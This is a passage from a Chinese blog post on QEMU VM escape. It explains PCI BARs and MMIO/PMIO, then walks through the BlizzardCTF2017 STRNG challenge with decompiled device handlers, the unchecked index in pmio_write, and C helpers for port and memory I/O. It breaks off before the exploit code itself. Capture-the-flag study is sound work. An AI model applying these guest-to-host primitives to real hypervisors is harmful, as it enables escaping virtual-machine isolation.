*addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line">    <span class="keyword">uint64_t</span> ptr_mem;</span><br><span class="line">    </span><br><span class="line">    fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(ptr, <span class="string">&quot;Where am I?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, ptr);</span><br><span class="line">    ptr_mem = gva_to_gpa(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your physical address is at 0x%&quot;</span>PRIx64<span class="string">&quot;\n&quot;</span>, ptr_mem);</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI"><a href="#PCI" class="headerlink" title="PCI"></a>PCI</h2><p>PCI是Peripheral Component Interconnect（外围设备互联）的简称，是普遍使用在桌面及更大型的计算机上的外设总线。PCI架构被设计为ISA标准的替代品，它有三个主要目标：获得在计算机和外设之间传输数据时更好的性能；尽可能的平台无关；简化往系统中添加和 删除外设的工作。</p><p>PCI是一种外设总线规范。我们先来看一下什么是总线：总线是一种传输信号的路径或信道。典型情况是，总线是连接于一个或多个导体的电气连线，总线上连接的所有设备可在同一时间收到所有的传输内容。总线由电气接口和编程接口组成。</p><p>PCI总线主要有三部分：</p><ol><li>PCI 设备。符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。</li><li>PCI 总线。PCI 总线在系统中可以有多条，类似于树状结构进行扩展，每条 PCI 总线都可以连接多个 PCI 设备/桥。</li><li>PCI桥。当一条 PCI 总线的承载量不够时，可以用新的 PCI 总线进行扩展，而 PCI 桥则是连接 PCI 总线之间的纽带。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><h3 id="PCI寻址"><a href="#PCI寻址" class="headerlink" title="PCI寻址"></a>PCI寻址</h3><p>直接来看一个具体的列子。<code>/proc/iomem</code>描述了系统内所有的设备在地址空间中的映射。(/proc/ioports描述了设备端口的映射)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">...</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /proc/iomem</span></span><br><span class="line">...</span><br><span class="line">febf1000-febf10ff : 0000:00:03.0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这是一个PCI设备，febf1000-febf10ff是它所映射的内存地址空间，占据了256bytes，0000:00:03.0则是这个PCI外设的地址，以冒号和点号分割成4部分，第一步16位表示域，第二个8位表示一个总线编号，第三个5位表示一个设备号，最后3位，表示功能号。</p><p>PCI规范允许单个系统最多拥有256条总线，所以总线编号为8位。但对于大型系统来说，这是不够的，所以引入了域的概念，每个PCI域最多拥有256条总线，每条总线最多拥有32个设备，所以为5位，而每个设备最多可有8中功能，所以为3位。</p><p>对于普通PC而言，一般只有一个域。</p><h3 id="PCI设备配置空间"><a href="#PCI设备配置空间" class="headerlink" title="PCI设备配置空间"></a>PCI设备配置空间</h3><p>PCI设备都有一个配置空间(PCI Configuration Space)，记录了该设备的详细信息。大小为256字节，其中前64字节是PCI标准规定的，并非所有字段必须填写，没用到的可以填充0。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/imgPci-config-space.png" alt="Pci-config-space"></p><p>其中的关键是BAR(Base Address Register)字段，记录了设备所需的地址空间及类型等属性。</p><p>Memory Space BAR Layout</p><table><thead><tr><th>31 - 4</th><th>3</th><th>2 - 1</th><th>0</th></tr></thead><tbody><tr><td>16-Byte Aligned Base Address</td><td>Prefetchable</td><td>Type</td><td>Always 0</td></tr></tbody></table><p>I/O Space BAR Layout</p><table><thead><tr><th>31 - 2</th><th>1</th><th>0</th></tr></thead><tbody><tr><td>4-Byte Aligned Base Address</td><td>Reserved</td><td>Always 1</td></tr></tbody></table><p>地址空间的类型包括Memory Space和I/O Space。使用BAR的最低bit区分。</p><p><strong>Memory Space</strong>，最低bit始终为0。type字段为0x00表示使用32bit地址，0x02表示使用64bit地址（64bit的BAR使用两个空间存储基址），0x01为PCI规范修订版3保留，早先版本使用bit1来支持低于1MB的地址空间。Prefetchable字段表示是否可以预取。</p><p>BAR基址的计算：</p><p>16bit—-BAR[x] &amp; 0xFFF0；</p><p>32bit—-BAR[x] &amp; 0xFFFFFFF0；</p><p>64bit—-(BAR[x] &amp; 0xFFFFFFF0) + ((BAR[x+1] &amp; 0xFFFFFFFF) &lt;&lt; 32)</p><p><strong>I/O Space</strong>，最低bit为1，一般不支持预取。</p><p>通过Memory Space访问设备I/O称为Memory-Mapped I/O(MMIO)，CPU直接使用普通的访存指令即可进行I/O。</p><p>通过I/O Space访问设备I/O称为Port I/O或者Port-Mapped I/O(PMIO)，这种情况下CPU使用专门的I/O指令（如<code>IN/OUT</code>）访问I/O端口。</p><p>可以通过查看<code>resource</code>文件，获得其MMIO和PMIO的地址/端口等信息。同一文件夹下面还有resource0和resource1文件，resource0对应mmio空间，resource1对应pmio空间。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span></span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（start-address）、结束地址（end-address）以及标识位（flags）。</p><p>更多关于PCI的说明可以看这篇文章<a href="https://zhuanlan.zhihu.com/p/26244141">https://zhuanlan.zhihu.com/p/26244141</a></p><h2 id="QOM"><a href="#QOM" class="headerlink" title="QOM"></a>QOM</h2><blockquote><p>QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。</p><p>由于qemu模拟设备以及CPU等，既有相应的共性又有自己的特性，因此使用面向对象来实现相应的程序是非常高效的，可以像理解C++或其它面向对象语言来理解QOM。</p><p>有几个比较关键的结构体，<code>TypeInfo</code>、<code>TypeImpl</code>、<code>ObjectClass</code>以及<code>Object</code>。其中ObjectClass、Object、TypeInfo定义在include/qom/object.h中，TypeImpl定义在qom/object.c中。</p></blockquote><p>对于这块的理解，直接读两个简单的例子比较方便。<a href="https://web.archive.org/web/20160413190044/http://ilevex.eu/post/88944209761/how-to-create-a-custom-pci-device-in-qemu">例子1</a> <a href="http://tic-le-polard.blogspot.com/2015/01/emulate-pci-device-with-qemu.html">例子2</a></p><p>进一步可以读读这两篇文章（不太必要，看完我依旧云里雾里的。。）<a href="https://www.binss.me/blog/qemu-note-of-qemu-object-model/">文章一</a> <a href="https://juniorprincewang.github.io/2018/07/23/qemu%E6%BA%90%E7%A0%81%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87/">文章二</a></p><h2 id="BlizzardCTF2017-STRNG"><a href="#BlizzardCTF2017-STRNG" class="headerlink" title="BlizzardCTF2017-STRNG"></a>BlizzardCTF2017-STRNG</h2><p>题目在<a href="https://github.com/rcvalle/blizzardctf2017">repository</a>的release中可以下载到</p><h3 id="Debugging"><a href="#Debugging" class="headerlink" title="Debugging"></a>Debugging</h3><p>使用gdbscript</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat gdbscript</span></span><br><span class="line">aslr off</span><br><span class="line"></span><br><span class="line">b strng_instance_init</span><br><span class="line">b strng_pmio_read</span><br><span class="line">b strng_pmio_write</span><br><span class="line"></span><br><span class="line">run  -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22</span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb -q qemu-system-x86_64</span></span><br><span class="line"><span class="meta">gdb&gt;</span><span class="bash"> <span class="built_in">source</span> gdbscript</span></span><br></pre></td></tr></table></figure><h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><h4 id="strng-mmio-read"><a href="#strng-mmio-read" class="headerlink" title="strng_mmio_read"></a>strng_mmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">strng_mmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">    result = opaque-&gt;regs[addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能读4个字节且”地址”必须4字节对齐，将地址转换成index读取数据。</p><h4 id="strng-mmio-write"><a href="#strng-mmio-write" class="headerlink" title="strng_mmio_write"></a>strng_mmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">strng_mmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  hwaddr idx; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> vala; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; !(addr &amp; <span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(opaque, idx, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;srand(val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vala = val;</span><br><span class="line">        v5 = opaque-&gt;rand_r(&amp;opaque-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">        LODWORD(val) = vala;</span><br><span class="line">        opaque-&gt;regs[<span class="number">3</span>] = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      opaque-&gt;regs[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>idx=0时，调用<code>srand(val)</code>设置随机种子</p><p>idx=1时，调用<code>rand()</code>设置随机值到regs[1]</p><p>idx&gt;=3时，将val设置到regs[idx]</p><p>看起来idx没有限制，但是PCI设备会进行内部的检查，因为PCI注册的MMIO空间大小只有256字节。</p><h4 id="编程进行MMIO"><a href="#编程进行MMIO" class="headerlink" title="编程进行MMIO"></a>编程进行MMIO</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)mmio_mem + addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR|O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;open mmio_fd failed&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><h4 id="strng-pmio-read"><a href="#strng-pmio-read" class="headerlink" title="strng_pmio_read"></a>strng_pmio_read</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">strng_pmio_read</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(v4 &amp; <span class="number">3</span>) )</span><br><span class="line">          result = opaque-&gt;regs[v4 &gt;&gt; <span class="number">2</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = opaque-&gt;addr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也可以发现，这些函数中的addr，都是起始端口/地址的偏移。</p><p>如果操作号(addr)是0，则读取存储的地址；</p><p>如果操作号是4，则读取地址处的值(regs[addr&gt;&gt;2])。</p><h4 id="strng-pmio-write"><a href="#strng-pmio-write" class="headerlink" title="strng_pmio_write"></a>strng_pmio_write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">strng_pmio_write</span><span class="params">(STRNGState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 idx; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = opaque-&gt;addr;</span><br><span class="line">        <span class="keyword">if</span> ( !(v4 &amp; <span class="number">3</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          idx = v4 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">1</span>] = ((__int64 (__fastcall *)(STRNGState *, __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand)(opaque, <span class="number">4L</span>L, val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt; <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;srand(val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)idx == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[<span class="number">3</span>] = ((__int64 (__fastcall *)(<span class="keyword">uint32_t</span> *, __int64, <span class="keyword">uint64_t</span>))opaque-&gt;rand_r)(</span><br><span class="line">                                &amp;opaque-&gt;regs[<span class="number">2</span>],</span><br><span class="line">                                <span class="number">4L</span>L,</span><br><span class="line">                                val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            opaque-&gt;regs[idx] = val;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;addr = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>操作号为0，则设置地址addr；</p><p>操作号为4，则写入数据。</p><ul><li><p>idx=0，srand设置种子</p></li><li><p>idx=1，regs[1]=rand()</p></li><li><p>idx=3，regs[3]=rand_r(&amp;opaque-&gt;regs[2])</p></li><li><p>idx&gt;3，regs[idx]=val</p></li></ul><p>这里看起来有机可乘，没有对PMIO的addr进行检查。</p><h4 id="编程进行PMIO"><a href="#编程进行PMIO" class="headerlink" title="编程进行PMIO"></a>编程进行PMIO</h4><p>使用&lt;sys/io.h&gt;中的outb/inb，outw/inw，outl/inl函数。</p><p>访问相应的端口需要一定的权限，程序应使用root权限执行。对于0x000-0x3ff之间的端口，使用<code>ioperm(from, num turn_on)</code>即可；对于0x3ff以上的端口，应调用<code>iopl(3)</code>去获取权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;iopl failed&quot;</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    pmio_read(pmio_base+<span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><a href="https://github.com/clxsh/ctf_wps/tree/master/others/qemu_pwn/BlizzardCTF2017_strng">exp和脚本</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td 